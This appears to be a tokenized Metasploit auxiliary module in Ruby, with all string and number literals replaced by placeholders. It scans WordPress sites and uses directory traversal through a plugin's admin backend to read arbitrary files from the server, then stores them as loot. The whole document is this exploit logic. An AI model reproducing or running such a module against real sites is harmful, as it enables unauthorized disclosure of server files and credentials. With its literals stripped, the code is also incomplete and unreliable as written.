require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Auxiliary :: Report include Msf :: Exploit :: Remote :: HTTP :: Wordpress include Msf :: Auxiliary :: Scanner def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def check check_plugin_version_from_readme ( <str> , <str> ) end def run_host ( ip ) traversal = <str> * datastore [ <str> ] filename = datastore [ <str> ] filename = filename [ <int> , filename . length ] if filename =~ <str> res = send_request_cgi ( <str> = > <str> , <str> = > normalize_uri ( wordpress_url_backend , <str> ) , <str> = > { <str> = > <str> , <str> = > <str> traversal <str> filename <str> } ) unless res && res . body vprint_error ( <str> ) return end if res . code == <int> && res . body . length > <int> && res . headers [ <str> ] && res . headers [ <str> ] . include? ( <str> ) && res . headers [ <str> ] && res . headers [ <str> ] . to_i > <int> vprint_line ( <str> res . body <str> ) fname = datastore [ <str> ] path = store_loot ( <str> , <str> , ip , res . body , fname ) print_good ( <str> path <str> ) else vprint_error ( <str> ) end end end 
